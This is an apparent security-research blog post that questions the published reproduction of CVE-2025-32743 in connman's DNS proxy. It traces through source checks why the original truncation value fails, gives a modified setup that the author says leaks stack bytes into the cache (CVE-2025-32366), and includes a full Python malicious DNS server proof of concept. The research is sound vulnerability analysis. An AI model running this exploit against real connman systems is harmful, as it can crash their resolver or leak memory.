layout: page
title: "FIRST"
permalink: /posts/first



# Questions to CVE-2025-32743 and CVE-2025-32366
This post provide some disproving research results of CVE-2025-32743. 

## Try to exploit the vulnerability with steps from original article
**Setup** 
1. qemu with Ubuntu-22 as VM1;
2. VM1: downloaded source code of connman from upstream repository https://git.kernel.org/pub/scm/network/connman/connman.git;
3. malicious DNS server on the same machine with VM1.

**Steps to reproduce**
1. Run VM1 and stop systemd-resolved: 
```
systemctl stop systemd-resolved
```
3. Go to connman folder, build and install:
```
./bootstrap
./configure CFLAGS="-g -O0" CXXFLAGS="-g -O0" --prefix=/usr --sysconfdir=/etc --localstatedir=/var --disable-dependency-tracking
make && sudo make install
```
3. Deploy connman:
```
systemctl daemon-reload
systemctl restart connman
```
4. Get default service:
```
connmanctl services
```
5. Configure service to use malicious DNS server:
```
connmanctl config <service> --nameservers <your_machine_ip>
```

when \<service\> - default service from step 4, e.g ethernet_525400123456_cable

6. Run maliciout DNS server outside the VM1:
```
sudo python3 poc.py --ip <your_machine_ip> --port 53 --truncate 254
```
7. Send several DNS requests from some client (nslookup or something else) inside VM1 that leads to cache our malicious DNS response in connman dnsproxy and then send DNS request again to trigger the vulnerability. For example:
```
nslookup tesla
nslookup -vc tesla
```

In video proof in the original article step 7 lead to connman crash.

**Observations about the original steps and video proof**
1. Running of PoC python script with `--truncate 254` cannot lead to add tricky DNS response to connman dnsproxy cache


`--truncate 254` is incorrect value because we cut too much bytes from DNS response and `dnsproxy.c:parse_responce` return -EINVAL because we missing 3 bytes to pass the condition
```
dnsproxy.c:parse_responce(...) {
  ...
  if (ptr + DNS_QUESTION_SIZE >= eptr)
    return -EINVAL;
  ...
}
```

`parse_responce` called from `cache_update` and if it's return error (-EINVAL in our case) than it *doesn't update the cache* what is a mandatory part for an exploit described in original article. 

Let's change truncate value to `--truncate 251` and let our 3 missing bytes be passed. Then we still can't update the cache because now `offset` in `dnsproxy.c:get_name` will be incorrect because of missing it's 1 byte and `get_name` return -ENOBUFS.

Use `--truncate 250` and `offset` will be correct, but then `dnsproxy.c:parse_response` still return another error -ENOMSG because we doesn't have 8 bytes of RDATA fields Type, Class and TTL that presented reproducer fill with 0x4141, we doesn't have 2 bytes of rdlength and as a result doesn't pass the condition
```
dnsproxy.c:parse_responce(...) {
  ...
  if (*class != qclass)
    continue;
  ...
}
```

So we need to use `--truncate 240` and change reproducer to pass correct Type and Class:
```
def build_answer_record(i):
    rr = bytearray()
    if i < NUM_ANSWERS - 1:
        ...
    else:
        ...
        rr += p16(0xc00c)          # Name: Compression pointer
        rr += p16(DNS_TYPE_A)          # Type
        rr += p16(DNS_CLASS_IN)          # Class 
        rr += p16(0x4141)          # Upper 16 bits of TTL
        rr += p16(0x4141)          # Lower 16 bits of TTL
        rr += p16(240)             # rdlength = 240
        ...
        
    return bytes(rr)
```

So, for now DNS answer can be added to connman dnsproxy cache with `rdlength` bytes from stack which is complete proof of CVE-2025-32366.

2. `lookup` string in `ns_resolv` cannot be NULL or empty.

Even if DNS client send empty string that connman dnsproxy will add `'.'` to question string.

## Python code for sending truncated DNS responses
poc.py
```
#!/usr/bin/env python3
import argparse
import socket
import struct
import threading

# -----------------------
# DNS Response Constants
# -----------------------
DNS_HEADER_SIZE      = 12       # DNS header size (12 bytes)
# Actual QNAME data length: each label is 63 bytes, with num_labels labels
NUM_QNAME_LABELS     = 4        # Example: 4 labels → total (4 * (1+63) + 1) = 257 bytes
EFFECTIVE_QNAME_LEN  = 300      # Effective QNAME length to use in the question section
ANSWER_FIXED_SIZE    = 12       # DNS Resource Record (RR) header size
LABEL_MAX_LEN        = 63       # Maximum length of each label (per RFC)
LABEL_COUNT          = 3        # Number of labels to use in a typical Answer record
NUM_ANSWERS          = 1        # Number of Answer records to generate
TRUNCATE_DEFAULT     = 255      # Number of bytes to truncate from the response

# DNS RR type/class values
DNS_TYPE_A       = 1
DNS_TYPE_CNAME   = 5
DNS_CLASS_IN     = 1

def p16(val):
    return struct.pack("!H", val)

def p32(val):
    return struct.pack("!I", val)

def build_dns_header(query_id):
    flags = 0x8000  # QR=1 (response)
    hdr  = p16(query_id)
    hdr += p16(flags)
    hdr += p16(1)             # QDCOUNT = 1
    hdr += p16(NUM_ANSWERS)   # ANCOUNT = NUM_ANSWERS
    hdr += p16(0)             # NSCOUNT = 0
    hdr += p16(0)             # ARCOUNT = 0
    return hdr

def build_question_section(qname_section):
    # Use EFFECTIVE_QNAME_LEN bytes from the QNAME section and append QTYPE and QCLASS
    return qname_section[:EFFECTIVE_QNAME_LEN] + p16(1) + p16(1)

def build_answer_record(i):
    rr = bytearray()
    if i < NUM_ANSWERS - 1:
        rr += p16(0xc00c)            # Name: Compression pointer (refers to the question section)
        rr += p16(DNS_TYPE_CNAME)     # Type: CNAME
        rr += p16(DNS_CLASS_IN)       # Class: IN
        rr += p32(60)               # TTL: 60 seconds
        rdata = bytearray()
        for j in range(LABEL_COUNT):
            rdata.append(LABEL_MAX_LEN)
            rdata.extend(b'A' * LABEL_MAX_LEN)
        rdata.append(0)
        rr += p16(len(rdata))
        rr += rdata
    else:
        # Last record: To trigger the vulnerability, set rdlength to 240,
        # RDATA is composed of a 2-byte compression pointer followed by 238 bytes of 'B'
        rr += p16(0xc00c)          # Name: Compression pointer
        rr += p16(0x4141)          # Type = 0x4141
        rr += p16(0x4141)          # Class = 0x4141
        rr += p16(0x4141)          # Upper 16 bits of TTL
        rr += p16(0x4141)          # Lower 16 bits of TTL
        rr += p16(240)             # rdlength = 240
        rdata = bytearray()
        rdata += p16(0xc00c)                # Valid compression pointer (2 bytes)
        rdata.extend(b'B' * (240 - 2))        # Remaining 238 bytes of 'B'
        rr += rdata
    return bytes(rr)

def create_tricky_dns_response(query_id, qname_section):
    print("create_tricky_dns_response")
    resp = bytearray()
    resp += build_dns_header(query_id)
    resp += build_question_section(qname_section)
    for i in range(NUM_ANSWERS):
        resp += build_answer_record(i)
    return bytes(resp)

def set_tc_bit(reply):
    if len(reply) < 4:
        print(f"set_tc_bit: return reply")
        return reply
    flags = struct.unpack("!H", reply[2:4])[0]
    print(f"Set TC bit")
    flags |= 0x0200  # Set the TC (Truncated) flag
    return reply[:2] + struct.pack("!H", flags) + reply[4:]

def extract_question_section(query):
    if len(query) <= DNS_HEADER_SIZE + 4:
        return None
    return query[DNS_HEADER_SIZE:]

def generate_strict_qname(num_labels):
    """
    Generate a QNAME with each label filled to the maximum length of 63 bytes.
    In DNS wire format, each label is prefixed by a 1-byte length field, followed by the label data,
    and terminated with a 0x00 byte. For example, with num_labels=4, each label consumes 1 + 63 bytes,
    totaling 4*64+1 = 257 bytes.
    """
    qname = bytearray()
    for _ in range(num_labels):
        qname.append(LABEL_MAX_LEN)               # Length field: 63
        qname.extend(b'a' * LABEL_MAX_LEN)          # 63 bytes of 'a'
    qname.append(0)                               # Null terminator
    return bytes(qname)

def udp_server(ip, port, truncate_bytes, qname_section):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))
    print(f"[INFO] UDP server running on {ip}:{port} (truncate={truncate_bytes})")
    while True:
        data, addr = sock.recvfrom(4096)
        print(f"[INFO] UDP request from {addr}, received {len(data)} bytes")
        if len(data) < DNS_HEADER_SIZE + 4:
            continue
        query_id = struct.unpack("!H", data[:2])[0]
        dns_resp = create_tricky_dns_response(query_id, qname_section)
        dns_resp = set_tc_bit(dns_resp)
        if len(dns_resp) > truncate_bytes:
            to_send = dns_resp[:len(dns_resp) - truncate_bytes]
        else:
            to_send = dns_resp
        print(f"[INFO] UDP: sending {len(to_send)} bytes to {addr}")
        sock.sendto(to_send, addr)

def tcp_server(ip, port, truncate_bytes, qname_section):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ip, port))
    sock.listen(5)
    print(f"[INFO] TCP server running on {ip}:{port} (truncate={truncate_bytes})")
    while True:
        conn, addr = sock.accept()
        print(f"[INFO] TCP connection from {addr}")
        data = conn.recv(4096)
        if len(data) < 2:
            conn.close()
            continue
        tcp_len = struct.unpack("!H", data[:2])[0]
        if len(data) < tcp_len + 2:
            conn.close()
            continue
        dns_query = data[2:2+tcp_len]
        if len(dns_query) < DNS_HEADER_SIZE + 4:
            conn.close()
            continue
        query_id = struct.unpack("!H", dns_query[:2])[0]
        dns_resp = create_tricky_dns_response(query_id, qname_section)
        if len(dns_resp) > truncate_bytes:
            to_send = dns_resp[:len(dns_resp) - truncate_bytes]
        else:
            to_send = dns_resp
        tcp_resp = struct.pack("!H", len(to_send)) + to_send
        conn.sendall(tcp_resp)
        conn.close()
        print(f"[INFO] TCP: sent {len(to_send)} bytes to {addr}")

def main():
    parser = argparse.ArgumentParser(
        description="DNS PoC for get_name() OOB write (Strict QNAME Version)"
    )
    parser.add_argument("--ip", default="0.0.0.0", help="Bind IP (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=53, help="Port (default: 53)")
    parser.add_argument("--truncate", type=int, default=TRUNCATE_DEFAULT,
                        help=f"Bytes to truncate from the end (default: {TRUNCATE_DEFAULT})")
    args = parser.parse_args()

    # Generate a QNAME composed of labels of maximum length (63 bytes)
    qname = generate_strict_qname(NUM_QNAME_LABELS)
    print(f"[INFO] Generated QNAME length: {len(qname)} bytes")

    t_udp = threading.Thread(target=udp_server, args=(args.ip, args.port, args.truncate, qname), daemon=True)
    t_tcp = threading.Thread(target=tcp_server, args=(args.ip, args.port, args.truncate, qname), daemon=True)
    t_udp.start()
    t_tcp.start()

    print("[INFO] DNS PoC servers started. Press Ctrl+C to exit.")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("[INFO] Exiting...")

if __name__ == "__main__":
    main()
```

